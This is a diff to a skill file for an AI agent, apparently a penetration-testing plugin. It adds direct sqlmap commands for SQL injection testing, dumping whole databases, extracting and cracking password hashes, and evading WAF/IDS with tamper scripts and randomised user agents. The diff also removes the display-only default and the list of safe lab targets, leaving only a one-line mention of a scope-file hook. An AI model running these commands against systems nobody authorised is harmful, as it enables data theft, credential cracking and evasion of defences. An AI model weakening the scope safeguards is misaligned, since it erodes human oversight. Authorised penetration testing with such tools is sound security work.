@@ -1,52 +1,79 @@
 ---
 name: sqlmap
-description: SQL injection detection and database extraction using sqlmap wrapper scripts
+description: >-
+  Detect SQL injection and extract databases with sqlmap. Parameter testing,
+  WAF bypass, database enumeration, tamper scripts.
 disable-model-invocation: true
 ---
 
 # SQLMap SQL Injection Tool
 
-Run sqlmap wrapper scripts for SQL injection testing with educational examples and structured JSON output.
+Detect SQL injection vulnerabilities and extract databases using sqlmap.
 
-## Available Scripts
+## Tool Status
+
+- Tool installed: !`command -v sqlmap > /dev/null 2>&1 && echo "YES -- $(sqlmap --version 2>/dev/null | head -1)" || echo "NO -- Install: brew install sqlmap (macOS) | apt install sqlmap (Debian/Ubuntu)"`
+- Wrapper scripts available: !`test -f scripts/sqlmap/test-all-parameters.sh && echo "YES -- use wrapper scripts for structured JSON output" || echo "NO -- using standalone mode with direct commands"`
+
+## Mode: Wrapper Scripts Available
+
+If wrapper scripts are available (shown as YES above), prefer these commands.
+They provide structured JSON output and educational context.
 
 ### Database Extraction
+- `bash scripts/sqlmap/dump-database.sh <target-url> -j -x` -- Enumerate and extract database contents via SQL injection
 
-- `bash scripts/sqlmap/dump-database.sh [target-url] [-j] [-x]` -- Enumerate and extract database contents via SQL injection
+### Parameter Testing
+- `bash scripts/sqlmap/test-all-parameters.sh <target-url> -j -x` -- Test all parameters in an HTTP request for SQL injection
 
-### Testing
-
-- `bash scripts/sqlmap/test-all-parameters.sh [target-url] [-j] [-x]` -- Thoroughly test all parameters in an HTTP request for SQL injection
-
-### Evasion
-
-- `bash scripts/sqlmap/bypass-waf.sh [target-url] [-j] [-x]` -- Use tamper scripts and techniques to evade WAF/IDS detection
+### WAF Bypass
+- `bash scripts/sqlmap/bypass-waf.sh <target-url> -j -x` -- Use tamper scripts and techniques to evade WAF/IDS detection
 
 ### Learning Mode
+- `bash scripts/sqlmap/examples.sh <target-url>` -- 10 common sqlmap patterns with explanations
 
-- `bash scripts/sqlmap/examples.sh [target-url]` -- View 10 common sqlmap patterns with explanations
+Always add `-j` for JSON output and `-x` to execute (vs display-only).
 
-## Flags
+## Mode: Standalone (Direct Commands)
 
-All use-case scripts support these flags:
+If wrapper scripts are NOT available, use these direct sqlmap commands.
 
-- `-j` / `--json` -- Output structured JSON envelope (enables PostToolUse hook summary)
-- `-x` / `--execute` -- Execute commands instead of displaying them
-- `--help` -- Show detailed usage, description, and examples for the script
+### Basic Injection Testing
 
-Add `-j` to every invocation so Claude receives a parsed summary via the PostToolUse hook.
-Without `-j`, Claude gets raw terminal output instead of structured results.
+Test URL parameters for SQL injection. The `--batch` flag auto-accepts defaults
+for non-interactive use. Start simple, then escalate.
+
+- `sqlmap -u "http://<target>/page?id=1" --batch` -- Test single parameter for SQLi
+- `sqlmap -u "http://<target>/page?id=1" --forms --batch` -- Auto-detect and test form parameters
+- `sqlmap -u "http://<target>/page?id=1" --crawl=2 --batch` -- Crawl site and test found parameters
+- `sqlmap -u "http://<target>/page?id=1" --level=5 --risk=3 --batch` -- Maximum detection sensitivity
+
+### Database Enumeration and Extraction
+
+Once injection is confirmed, enumerate databases, tables, and columns. Then
+dump specific data. Always enumerate before dumping to avoid pulling everything.
+
+- `sqlmap -u "http://<target>/page?id=1" --dbs --batch` -- List all databases
+- `sqlmap -u "http://<target>/page?id=1" -D <db> --tables --batch` -- List tables in database
+- `sqlmap -u "http://<target>/page?id=1" -D <db> -T <table> --columns --batch` -- List columns
+- `sqlmap -u "http://<target>/page?id=1" -D <db> -T <table> --dump --batch` -- Dump table contents
+- `sqlmap -u "http://<target>/page?id=1" --passwords --batch` -- Extract and crack password hashes
+
+### WAF Bypass and Evasion
+
+Tamper scripts modify payloads to evade Web Application Firewalls and IDS.
+Combine multiple tamper scripts for better evasion.
+
+- `sqlmap -u "http://<target>/page?id=1" --tamper=space2comment --batch` -- Replace spaces with comments
+- `sqlmap -u "http://<target>/page?id=1" --random-agent --batch` -- Randomize User-Agent header
+- `sqlmap -u "http://<target>/page?id=1" --tamper=between,randomcase --random-agent --batch` -- Combined evasion
+- `sqlmap -u "http://<target>/page?id=1" --delay=2 --batch` -- Add delay between requests
 
 ## Defaults
 
-- Target defaults to a sample vulnerable URL when not provided
-- Scripts display commands without running them unless `-x` is passed
+- Target should be a URL with injectable parameters
+- `--batch` flag is recommended for non-interactive execution
 
 ## Target Validation
 
-All scripts validate targets against `.pentest/scope.json` via the PreToolUse hook.
-If commands are blocked:
-
-1. Run `/netsec-health` to check safety architecture status
-2. Verify your target is listed in `.pentest/scope.json`
-3. Default safe targets: localhost, 127.0.0.1, lab containers (ports 8080, 3030, 8888, 8180)
+All commands validate targets against `.pentest/scope.json` via the PreToolUse hook.
